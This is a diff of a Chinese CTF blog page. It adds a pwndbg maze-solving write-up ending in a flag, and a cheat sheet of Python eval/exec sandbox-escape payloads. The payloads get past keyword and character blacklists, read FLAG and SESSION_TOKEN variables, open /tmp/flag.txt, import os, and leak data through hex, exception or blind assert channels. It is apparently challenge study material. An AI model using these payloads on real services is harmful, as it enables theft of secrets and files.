@@ -232,6 +232,105 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/03/20/easy-Maze-%E8%BF%B7%E5%AE%AB%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD-%E7%94%A8pwndbg/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/20/easy-Maze-%E8%BF%B7%E5%AE%AB%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD-%E7%94%A8pwndbg/" class="post-title-link" itemprop="url">easy_Maze(迷宫在内存中,用pwndbg)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-03-20 14:44:31" itemprop="dateCreated datePublished" datetime="2025-03-20T14:44:31+08:00">2025-03-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-09-23 20:33:04" itemprop="dateModified" datetime="2025-09-23T20:33:04+08:00">2025-09-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/reverse/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>直接记重点，怎么用pwndbg找内存中的迷宫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb 文件名</span><br><span class="line">b Step_1 #把段点下在Step_1</span><br><span class="line">r  #开始运行</span><br><span class="line">finish #返回主函数，此时Step_1的函数已经执行完了</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>x：查看内存</li>
+<li>49：49个单元</li>
+<li>d：按照10进制查看</li>
+<li>w：四个字节为一个单元（int）</li>
+<li>$rsp：内存地址在rsp中</li>
+</ul>
+<p>最终查内存的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x /49dw $rsp#其他题根据具体情况自己调整</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/20/easy-Maze-%E8%BF%B7%E5%AE%AB%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD-%E7%94%A8pwndbg/1.png" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1 0 0 1 1 1 1</span><br><span class="line">1 0 1 1 0 0 1</span><br><span class="line">1 1 1 0 1 1 1</span><br><span class="line">0 0 0 1 1 0 0</span><br><span class="line">1 1 1 1 0 0 0</span><br><span class="line">1 0 0 0 1 1 1</span><br><span class="line">1 1 1 1 0 1 1</span><br></pre></td></tr></table></figure>
+
+<p>然后我在写下本题的思路step_0和step_1都是构造迷宫。我们已经通过动态调试得到了，感觉还可以就是自己模拟伪代码构造出迷宫，但是我能力有限，以后再试试。</p>
+<p>step_2大概得意思就是w上，s下，a左，d右的意思，然后都要走1</p>
+<p><img src="/2025/03/20/easy-Maze-%E8%BF%B7%E5%AE%AB%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD-%E7%94%A8pwndbg/2.png" alt="2"></p>
+<p>最后得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;ssddwdwdddssaasasaaassddddwdds&#125;</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/03/16/pwnable-start-%E5%8F%AA%E8%83%BD%E7%9C%8B%E6%B1%87%E7%BC%96/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1145,7 +1244,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-09-23 20:16:47" itemprop="dateModified" datetime="2025-09-23T20:16:47+08:00">2025-09-23</time>
+                <time title="修改时间：2026-08-10 23:11:43" itemprop="dateModified" datetime="2026-08-10T23:11:43+08:00">2026-08-10</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1221,6 +1320,107 @@
 <li>通过<code>globals()</code>和<code>__builtins__</code>间接获取<code>open</code>函数。</li>
 <li>最终调用<code>open(&#39;/tmp/flag.txt&#39;).read()</code>读取文件内容，并用<code>print</code>确保输出。</li>
 </ol>
+<h1 id="1-exec-多语句类"><a href="#1-exec-多语句类" class="headerlink" title="1. exec 多语句类"></a>1. exec 多语句类</h1><h2 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">后端类似：</span><br><span class="line">exec(user_input)</span><br><span class="line"></span><br><span class="line">可以写多行</span><br><span class="line">可以写 for / if / try</span><br><span class="line">print 有输出</span><br></pre></td></tr></table></figure>
+
+<h2 id="首选模板：变量搜索-分段-hex-输出"><a href="#首选模板：变量搜索-分段-hex-输出" class="headerlink" title="首选模板：变量搜索 + 分段 hex 输出"></a>首选模板：变量搜索 + 分段 hex 输出</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">KEYWORDS = [<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;SECRET&quot;</span>, <span class="string">&quot;TOKEN&quot;</span>, <span class="string">&quot;SESSION&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;RESULT_BEGIN&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> name, value <span class="keyword">in</span> <span class="built_in">globals</span>().items():</span><br><span class="line">    hit = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> KEYWORDS:</span><br><span class="line">        <span class="keyword">if</span> keyword.upper() <span class="keyword">in</span> name.upper():</span><br><span class="line">            hit = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> hit:</span><br><span class="line">        value = <span class="built_in">str</span>(value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;NAME&quot;</span>, name)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(value), <span class="number">4</span>):</span><br><span class="line">            part = value[i:i + <span class="number">4</span>]</span><br><span class="line">            <span class="built_in">print</span>(i, <span class="string">&quot;&quot;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(ch), <span class="string">&quot;02x&quot;</span>) <span class="keyword">for</span> ch <span class="keyword">in</span> part))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;RESULT_END&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="2-eval-单表达式类"><a href="#2-eval-单表达式类" class="headerlink" title="2. eval 单表达式类"></a>2. eval 单表达式类</h1><h2 id="适用条件-1"><a href="#适用条件-1" class="headerlink" title="适用条件"></a>适用条件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">后端类似：</span><br><span class="line">result = eval(user_input)</span><br><span class="line"></span><br><span class="line">只能输入表达式</span><br><span class="line">关键词和特殊字符限制较少</span><br><span class="line">目标变量名已知</span><br></pre></td></tr></table></figure>
+
+<h2 id="首选模板：lambda-单表达式-变量名动态构造-hex-输出"><a href="#首选模板：lambda-单表达式-变量名动态构造-hex-输出" class="headerlink" title="首选模板：lambda 单表达式 + 变量名动态构造 + hex 输出"></a>首选模板：lambda 单表达式 + 变量名动态构造 + hex 输出</h2><p>以 <code>SESSION_TOKEN</code> 为例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> n: <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(ch), <span class="string">&quot;02x&quot;</span>) <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">str</span>(<span class="built_in">globals</span>()[n]))))(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">83</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">78</span>,<span class="number">95</span>,<span class="number">84</span>,<span class="number">79</span>,<span class="number">75</span>,<span class="number">69</span>,<span class="number">78</span>]))</span><br></pre></td></tr></table></figure>
+
+<p>以 <code>FLAG</code> 为例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> n: <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(ch), <span class="string">&quot;02x&quot;</span>) <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">str</span>(<span class="built_in">globals</span>()[n]))))(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">70</span>,<span class="number">76</span>,<span class="number">65</span>,<span class="number">71</span>]))</span><br></pre></td></tr></table></figure>
+
+<h2 id="如果-eval-返回值会直接显示"><a href="#如果-eval-返回值会直接显示" class="headerlink" title="如果 eval 返回值会直接显示"></a>如果 eval 返回值会直接显示</h2><p>用不带 <code>print</code> 的版本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> n: <span class="string">&quot;&quot;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(ch), <span class="string">&quot;02x&quot;</span>) <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">str</span>(<span class="built_in">globals</span>()[n])))(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">83</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">78</span>,<span class="number">95</span>,<span class="number">84</span>,<span class="number">79</span>,<span class="number">75</span>,<span class="number">69</span>,<span class="number">78</span>]))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="3-eval-关键词黑名单类"><a href="#3-eval-关键词黑名单类" class="headerlink" title="3. eval + 关键词黑名单类"></a>3. eval + 关键词黑名单类</h1><h2 id="适用条件-2"><a href="#适用条件-2" class="headerlink" title="适用条件"></a>适用条件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">后端类似：</span><br><span class="line">result = eval(user_input)</span><br><span class="line"></span><br><span class="line">禁关键词：</span><br><span class="line">import / eval / exec / open / file</span><br><span class="line"></span><br><span class="line">但没有禁：</span><br><span class="line">. _ [ ] 引号</span><br></pre></td></tr></table></figure>
+
+<h2 id="首选模板-A：读已知变量"><a href="#首选模板-A：读已知变量" class="headerlink" title="首选模板 A：读已知变量"></a>首选模板 A：读已知变量</h2><p>以 <code>SESSION_TOKEN</code> 为例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> n: <span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(ch), <span class="string">&quot;02x&quot;</span>) <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">str</span>(<span class="built_in">globals</span>()[n]))))(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">83</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">78</span>,<span class="number">95</span>,<span class="number">84</span>,<span class="number">79</span>,<span class="number">75</span>,<span class="number">69</span>,<span class="number">78</span>]))</span><br></pre></td></tr></table></figure>
+
+<h2 id="首选模板-B：关键词被禁时拆分函数名"><a href="#首选模板-B：关键词被禁时拆分函数名" class="headerlink" title="首选模板 B：关键词被禁时拆分函数名"></a>首选模板 B：关键词被禁时拆分函数名</h2><p>适用于 <code>__builtins__</code> 是模块的环境：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(__builtins__, <span class="string">&quot;o&quot;</span> + <span class="string">&quot;pen&quot;</span>)(<span class="string">&quot;/tmp/flag.txt&quot;</span>).read())</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">getattr</span>(__builtins__, <span class="string">&quot;__imp&quot;</span> + <span class="string">&quot;ort__&quot;</span>)(<span class="string">&quot;os&quot;</span>).listdir(<span class="string">&quot;/tmp&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<p>适用于 <code>__builtins__</code> 是字典的环境：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(__builtins__[<span class="string">&quot;o&quot;</span> + <span class="string">&quot;pen&quot;</span>](<span class="string">&quot;/tmp/flag.txt&quot;</span>).read())</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(__builtins__[<span class="string">&quot;__imp&quot;</span> + <span class="string">&quot;ort__&quot;</span>](<span class="string">&quot;os&quot;</span>).listdir(<span class="string">&quot;/tmp&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="4-eval-特殊字符黑名单类"><a href="#4-eval-特殊字符黑名单类" class="headerlink" title="4. eval + 特殊字符黑名单类"></a>4. eval + 特殊字符黑名单类</h1><h2 id="适用条件-3"><a href="#适用条件-3" class="headerlink" title="适用条件"></a>适用条件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">后端类似：</span><br><span class="line">result = eval(user_input)</span><br><span class="line"></span><br><span class="line">禁字符：</span><br><span class="line">. _ [ ] &#x27; &quot;</span><br><span class="line"></span><br><span class="line">但还允许：</span><br><span class="line">chr</span><br><span class="line">getattr</span><br><span class="line">globals</span><br><span class="line">str</span><br><span class="line">map</span><br><span class="line">format</span><br><span class="line">ord</span><br><span class="line">print</span><br><span class="line">lambda</span><br></pre></td></tr></table></figure>
+
+<h2 id="首选模板：chr-构造-getattr-替代点号-单表达式"><a href="#首选模板：chr-构造-getattr-替代点号-单表达式" class="headerlink" title="首选模板：chr 构造 + getattr 替代点号 + 单表达式"></a>首选模板：chr 构造 + getattr 替代点号 + 单表达式</h2><p>以 <code>SESSION_TOKEN</code> 为例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> n:<span class="built_in">print</span>(<span class="built_in">getattr</span>(<span class="built_in">str</span>(),<span class="built_in">chr</span>(<span class="number">106</span>)+<span class="built_in">chr</span>(<span class="number">111</span>)+<span class="built_in">chr</span>(<span class="number">105</span>)+<span class="built_in">chr</span>(<span class="number">110</span>))(<span class="built_in">map</span>(<span class="keyword">lambda</span> c:<span class="built_in">format</span>(<span class="built_in">ord</span>(c),<span class="built_in">chr</span>(<span class="number">48</span>)+<span class="built_in">chr</span>(<span class="number">50</span>)+<span class="built_in">chr</span>(<span class="number">120</span>)),<span class="built_in">str</span>(<span class="built_in">getattr</span>(<span class="built_in">globals</span>(),<span class="built_in">chr</span>(<span class="number">103</span>)+<span class="built_in">chr</span>(<span class="number">101</span>)+<span class="built_in">chr</span>(<span class="number">116</span>))(n))))))(<span class="built_in">chr</span>(<span class="number">83</span>)+<span class="built_in">chr</span>(<span class="number">69</span>)+<span class="built_in">chr</span>(<span class="number">83</span>)+<span class="built_in">chr</span>(<span class="number">83</span>)+<span class="built_in">chr</span>(<span class="number">73</span>)+<span class="built_in">chr</span>(<span class="number">79</span>)+<span class="built_in">chr</span>(<span class="number">78</span>)+<span class="built_in">chr</span>(<span class="number">95</span>)+<span class="built_in">chr</span>(<span class="number">84</span>)+<span class="built_in">chr</span>(<span class="number">79</span>)+<span class="built_in">chr</span>(<span class="number">75</span>)+<span class="built_in">chr</span>(<span class="number">69</span>)+<span class="built_in">chr</span>(<span class="number">78</span>))</span><br></pre></td></tr></table></figure>
+
+<h2 id="模板含义"><a href="#模板含义" class="headerlink" title="模板含义"></a>模板含义</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chr(95) 构造下划线</span><br><span class="line">chr(...) 构造 SESSION_TOKEN</span><br><span class="line">getattr(globals(), &quot;get&quot;) 替代 globals().get</span><br><span class="line">getattr(str(), &quot;join&quot;) 替代 &quot;&quot;.join</span><br><span class="line">format(ord(c), &quot;02x&quot;) 输出十六进制</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="5-输出审查类"><a href="#5-输出审查类" class="headerlink" title="5. 输出审查类"></a>5. 输出审查类</h1><h2 id="适用条件-4"><a href="#适用条件-4" class="headerlink" title="适用条件"></a>适用条件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">代码能执行</span><br><span class="line">目标能读到</span><br><span class="line">但原文输出被屏蔽、替换、截断</span><br></pre></td></tr></table></figure>
+
+<h2 id="首选模板：分段-hex-输出"><a href="#首选模板：分段-hex-输出" class="headerlink" title="首选模板：分段 hex 输出"></a>首选模板：分段 hex 输出</h2><p>已知变量名为 <code>SESSION_TOKEN</code>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">83</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">79</span>, <span class="number">75</span>, <span class="number">69</span>, <span class="number">78</span>])</span><br><span class="line">value = <span class="built_in">str</span>(<span class="built_in">globals</span>()[name])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HEX_BEGIN&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(value), <span class="number">4</span>):</span><br><span class="line">    part = value[i:i + <span class="number">4</span>]</span><br><span class="line">    <span class="built_in">print</span>(i, <span class="string">&quot;&quot;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(ch), <span class="string">&quot;02x&quot;</span>) <span class="keyword">for</span> ch <span class="keyword">in</span> part))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HEX_END&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="备用输出方式"><a href="#备用输出方式" class="headerlink" title="备用输出方式"></a>备用输出方式</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">83</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">79</span>, <span class="number">75</span>, <span class="number">69</span>, <span class="number">78</span>])</span><br><span class="line">value = <span class="built_in">str</span>(<span class="built_in">globals</span>()[name])</span><br><span class="line"><span class="built_in">print</span>([<span class="built_in">ord</span>(ch) <span class="keyword">for</span> ch <span class="keyword">in</span> value])</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="6-print-不回显但异常回显类"><a href="#6-print-不回显但异常回显类" class="headerlink" title="6. print 不回显但异常回显类"></a>6. print 不回显但异常回显类</h1><h2 id="适用条件-5"><a href="#适用条件-5" class="headerlink" title="适用条件"></a>适用条件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print 没有输出</span><br><span class="line">但报错信息会显示</span><br></pre></td></tr></table></figure>
+
+<h2 id="首选模板：异常带出-hex"><a href="#首选模板：异常带出-hex" class="headerlink" title="首选模板：异常带出 hex"></a>首选模板：异常带出 hex</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">83</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">79</span>, <span class="number">75</span>, <span class="number">69</span>, <span class="number">78</span>])</span><br><span class="line">value = <span class="built_in">str</span>(<span class="built_in">globals</span>()[name])</span><br><span class="line">encoded = <span class="string">&quot;&quot;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(ch), <span class="string">&quot;02x&quot;</span>) <span class="keyword">for</span> ch <span class="keyword">in</span> value)</span><br><span class="line"><span class="keyword">raise</span> Exception(encoded)</span><br></pre></td></tr></table></figure>
+
+<h2 id="eval-单表达式版本"><a href="#eval-单表达式版本" class="headerlink" title="eval 单表达式版本"></a>eval 单表达式版本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> n:(_ <span class="keyword">for</span> _ <span class="keyword">in</span> ()).throw(Exception(<span class="string">&quot;&quot;</span>.join(<span class="built_in">format</span>(<span class="built_in">ord</span>(ch),<span class="string">&quot;02x&quot;</span>) <span class="keyword">for</span> ch <span class="keyword">in</span> <span class="built_in">str</span>(<span class="built_in">globals</span>()[n])))))(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">83</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">78</span>,<span class="number">95</span>,<span class="number">84</span>,<span class="number">79</span>,<span class="number">75</span>,<span class="number">69</span>,<span class="number">78</span>]))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="7-完全无回显类"><a href="#7-完全无回显类" class="headerlink" title="7. 完全无回显类"></a>7. 完全无回显类</h1><h2 id="适用条件-6"><a href="#适用条件-6" class="headerlink" title="适用条件"></a>适用条件</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print 不显示</span><br><span class="line">eval 返回值不显示</span><br><span class="line">异常内容也不显示</span><br><span class="line">但页面能区分成功 / 失败</span><br></pre></td></tr></table></figure>
+
+<h2 id="首选模板：assert-判断"><a href="#首选模板：assert-判断" class="headerlink" title="首选模板：assert 判断"></a>首选模板：assert 判断</h2><p>判断长度：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">83</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">79</span>, <span class="number">75</span>, <span class="number">69</span>, <span class="number">78</span>])</span><br><span class="line">value = <span class="built_in">str</span>(<span class="built_in">globals</span>()[name])</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(value) &gt; <span class="number">20</span></span><br></pre></td></tr></table></figure>
+
+<p>判断某一位字符：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name = <span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">83</span>, <span class="number">69</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">73</span>, <span class="number">79</span>, <span class="number">78</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">79</span>, <span class="number">75</span>, <span class="number">69</span>, <span class="number">78</span>])</span><br><span class="line">value = <span class="built_in">str</span>(<span class="built_in">globals</span>()[name])</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">ord</span>(value[<span class="number">0</span>]) &gt; <span class="number">100</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="eval-单表达式版本-1"><a href="#eval-单表达式版本-1" class="headerlink" title="eval 单表达式版本"></a>eval 单表达式版本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">lambda</span> n: <span class="number">1</span> <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(<span class="built_in">globals</span>()[n])) &gt; <span class="number">20</span> <span class="keyword">else</span> <span class="number">1</span>/<span class="number">0</span>)(<span class="string">&quot;&quot;</span>.join(<span class="built_in">chr</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">83</span>,<span class="number">69</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">78</span>,<span class="number">95</span>,<span class="number">84</span>,<span class="number">79</span>,<span class="number">75</span>,<span class="number">69</span>,<span class="number">78</span>]))</span><br></pre></td></tr></table></figure>
+
